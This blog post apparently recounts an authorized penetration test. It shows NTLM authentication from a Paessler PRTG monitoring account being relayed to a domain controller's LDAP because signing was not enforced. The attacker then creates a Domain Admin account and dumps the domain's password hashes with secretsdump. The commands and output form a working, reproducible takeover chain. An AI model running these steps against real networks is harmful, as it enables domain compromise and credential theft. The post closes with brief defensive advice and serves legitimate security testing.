---
title: PWNING a DC via Paessler's monitoring system
date: 01/12/2024
tags: [real-life, DC, LDAP]
---

<h1> Paessler Monitoring system? </h1>
During a recent engagement, while trying to perform SMB relaying on a potentially vulnerable target, I noticed some hits on my <a href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx </a> instance that I did not initiate ðŸ¤”

```console
[kali@kali]$ impacket-ntlmrelayx -t 10.10.0.66 -smb2support 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
[*] Protocol Client LDAP loaded.. 
[*] Protocol Client LDAPS loaded.. 
[*] Protocol Client SMB loaded.. 
[*] Protocol Client RPC loaded.. 
[*] Protocol Client HTTPS loaded.. 
[*] Protocol Client HTTP loaded.. 
[*] Protocol Client MSSQL loaded.. 
[*] Protocol Client DCSYNC loaded.. 
[*] Protocol Client IMAP loaded.. 
[*] Protocol Client IMAPS loaded.. 
[*] Protocol Client SMTP loaded.. 
[*] Running in relay mode to single host 
[*] Setting up SMB Server on port 445 
[*] Setting up HTTP Server on port 80 
[*] Setting up WCF Server on port 9389 
[*] Setting up RAW Server on port 6666 
[*] Multirelay disabled 
 
[*] Servers started, waiting for connections 
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.0.50, attacking target smb://10.10.0.66 
[*] Authenticating against smb://10.10.0.66 as REDACTED/DEV-DC31$ SUCCEED 
[*] All targets processed!
```
<br>
This could be an indication that there is an automated task that makes machines automatically authenticate to my services on the network. 

To make things easier for me, I decided to check if the DC supports LDAP signing in order to relay this authentication to it and get an LDAP shell, from where we can perform <i>evil stuff</i>. ðŸ˜ˆ
To do so, we unfortunately need to have a domain account set up. 

<b>This step is not necessary if you don't have creds, but will save you time.</b>

Going to the terminal, I ran <a href="https://www.netexec.wiki/" >Netexec </a> against the DC with the module <b> ldap-checker </b> and saw that LDAP signing was not enforced:

```console
[kali@kali]$ netexec ldap 10.10.0.50 -u pentester -p Y3llow3Fl0wer -M ldap-checker

SMB         10.10.0.50      445    DEV-DC31         [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DC31) (domain:REDACTED) (signing:True) (SMBv1:False)
LDAP        10.10.0.50      389    DEV-DC31         [+] REDACTED\pentester:Y3llow3Fl0wer                                              
LDAP-CHE... 10.10.0.50      389    DEV-DC31         LDAP Signing NOT Enforced!                                                                   
LDAP-CHE... 10.10.0.50      389    DEV-DC31         LDAPS Channel Binding is set to "When Supported" 
```
<br>
The next thing to immediately do was to setup ntlmrelayx to relay directly to the DC's LDAP.

```console
[kali@kali]$ impacket-ntlmrelayx -t 10.10.0.50 -smb2support -i
```
<br>
We have speficied the DC with the <b>-t</b> option and used the <b>-i</b> option to establish an interactive LDAP shell.

After a minute or two of waiting, REDACTED/SERVICE.PRTG automatically authenticated and we relayed the connection to the DC's LDAP:

```console
[kali@kali]$ impacket-ntlmrelayx -t ldaps://10.10.0.50 --shadow-credentials -i            
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client LDAP loaded..                                              
[*] Protocol Client LDAPS loaded..                                             
[*] Protocol Client SMB loaded..                                               
[*] Protocol Client RPC loaded..                                               
[*] Protocol Client HTTP loaded..                                              
[*] Protocol Client HTTPS loaded..                                             
[*] Protocol Client MSSQL loaded..                                             
[*] Protocol Client DCSYNC loaded..                                            
[*] Protocol Client IMAPS loaded..                                             
[*] Protocol Client IMAP loaded..                                              
[*] Protocol Client SMTP loaded..                                              
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445                                          
[*] Setting up HTTP Server on port 80                                          
[*] Setting up WCF Server on port 9389                                         
[*] Setting up RAW Server on port 6666                                         
[*] Multirelay disabled                                                        

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.0.50, attacking target ldaps://10.10.0.50                                          
[*] SMBD-Thread-6 (process_request_thread): Received connection from 10.10.0.50, attacking target ldaps://10.10.0.50                                          
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.10.0.138, attacking target ldaps://10.10.0.50                                         
[*] SMBD-Thread-8 (process_request_thread): Received connection from 10.10.0.138, attacking target ldaps://10.10.0.50                                         
[*] Authenticating against ldaps://10.10.0.50 as REDACTED/SERVICE.PRTG SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000 as REDACTED/SERVICE.PRTG
```
<br>
We can see that we have successfully relayed the connection to the DC and have established an interactive LDAP shell locally on port 11000 which we can access via netcat.

Before we do so, why was this attack was possible? ðŸ¤” Even if LDAP signing is disabled, why did <b>SERVICE.PRTG</b> automatically authenticate to our server?

After some digging, we see that SERVICE.PRTG is related to a monitoring tool by <a href="https://www.paessler.com/">Paessler</a>. Paessler provides numerous sensors for network and system monitoring which can be found <a href="https://www.paessler.com/manuals/prtg/list_of_available_sensor_types">here</a>.

Since we are interested in LDAP, we do a quick search on their website and see the the following:

<img src="/assets/img/paessler-ldap-sensor.png">

<br>
The sensor <b>"connects to the server by trying a bind"</b>, which now explains why we were getting random authentications to our SMB and LDAP ntlmrelayx instances.
<br>

<img src="/assets/img/pwn-me.jpg">

<br>
<h1> Easy takeover incoming </h1>
We will connect to the interactive shell with netcat:
```console
[kali@kali]$ nc 127.0.0.1 11000
```
<br>
Inside of the shell, we confirm we are the user <b>SERVICE.PRTG</b> and we proceed to adding a new user to the Domain Administrators group:

```console
# whoami                                                                       
u:REDACTED\service.prtg

# add_user Pentest-User
Attempting to create user in: %s CN=Users,DC=REDACTED,DC=REDACTED
Adding new user with username: Pentest-User and password: c,n3nF["dH[h=&P result: OK

# search Pentest-User
CN=Pentest-User,CN=Users,DC=REDACTED,DC=REDACTED
name: Pentest-User
distinguishedName: CN=Pentest-User,CN=Users,DC=REDACTED,DC=REDACTED
sAMAccountName: Pentest-User
objectSid: S-1-5-21-854245398-1004336348-1801673123-2222

# enable_account Pentest-User
Original userAccountControl: 512
Updated userAccountControl attribute successfully                            

# add_user_to_group Pentest-User "Domain Admins"
Adding user: Pentest-User to group Domain Admins result: OK
```
<br>
The user show now be a Domain Admin, lets quickly confirm that with netexec:
```console
[kali@kali]$ netexec smb DC.txt -u Pentest-User -p 'c,n3nF["dH[h=&P'
SMB         200.200.205.15  445    DEV-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DC01) (domain:REDACTED) (signing:True) (SMBv1:False)
SMB         10.10.0.108     445    DEV-DC31         [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DC31) (domain:REDACTED) (signing:True) (SMBv1:False)
SMB         10.10.0.50      445    DEV-DC31         [*] Windows 10 / Server 2019 Build 17763 x64 (name:DEV-DC31) (domain:REDACTED) (signing:True) (SMBv1:False)
SMB         10.10.0.116     445    DEV-PDC03        [*] Windows Server 2022 Build 20348 x64 (name:DEV-PDC03) (domain:REDACTED) (signing:True) (SMBv1:False)
SMB         200.200.205.15  445    DEV-DC01         [+] REDACTED\Pentest-User:c,n3nF["dH[h=&P (Pwn3d!)
SMB         10.10.0.108     445    DEV-DC31         [+] REDACTED\Pentest-User:c,n3nF["dH[h=&P (Pwn3d!)
SMB         10.10.0.50      445    DEV-DC31         [+] REDACTED\Pentest-User:c,n3nF["dH[h=&P (Pwn3d!)
SMB         10.10.0.116     445    DEV-PDC03        [+] REDACTED\Pentest-User:c,n3nF["dH[h=&P (Pwn3d!)
```
<br>
And just like that we managed to PWN multiple networks! As the grand finale lets dump all the hashes with Impacket's Secretsdump:

```console
[kali@kali]$ impacket-secretsdump REDACTED/Pentest-User:'c,n3nF["dH[h=&P'@10.10.0.50
Impacketv0.12.0-CopyrightFortra,LLCanditsaffiliatedcompanies

[*]ServiceRemoteRegistryisinstoppedstate
[*]StartingserviceRemoteRegistry
[*]TargetsystembootKey:REDACTED
[-]SAMhashesextractionfailed:SMBSessionError:code:0xc00000b1-STATUS_PIPE_CLOSING-Thespecifiednamedpipeisintheclosingstate.
[-]LSAhashesextractionfailed:SMBSessionError:code:0xc00000b1-STATUS_PIPE_CLOSING-Thespecifiednamedpipeisintheclosingstate.
[*]DumpingDomainCredentials(domain\uid:rid:lmhash:nthash)
[*]UsingtheDRSUAPImethodtogetNTDS.DITsecrets

REDACTED\administrator:500:REDACTED:REDACTED:::
Guest:501:REDACTED:REDACTED:::
krbtgt:502:REDACTED:REDACTED:::
REDACTED\InternetUser:1000:REDACTED:REDACTED:::
REDACTED\n.mullen:2120:REDACTED:REDACTED:::
REDACTED\b.brennan:2137:REDACTED:REDACTED:::
REDACTED\info:2145:REDACTED:REDACTED:::
REDACTED\o.jackson:2147:REDACTED:REDACTED:::
REDACTED\a.mcguire:2157:REDACTED:REDACTED:::
REDACTED\b.dawson:2162:REDACTED:REDACTED:::
REDACTED\s.bristow:2164:REDACTED:REDACTED:::
REDACTED\s.campbell:2165:REDACTED:REDACTED:::
REDACTED\q.scott:2166:REDACTED:REDACTED:::
REDACTED\i.sheehy:2170:REDACTED:REDACTED:::
REDACTED\k.coffey:2176:REDACTED:REDACTED:::
REDACTED\s.oconnell:2177:REDACTED:REDACTED:::
REDACTED\m.otoole:2181:REDACTED:REDACTED:::
...
```
<br>
<center> <b> Lo and behold, we have demolished a domain without any credentials. </b></center>
<br>

<h1> Conclusions </h1>
- Enable LDAP signing
- Don't let a service automatically authenticate to any LDAP servers on the network

<h1> Resources </h1>
- [I'm Bringing Back Relaying](https://trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022)
- [Beyond the Basics: Exploring Uncommon NTLM Relay Attack Techniques](https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/)
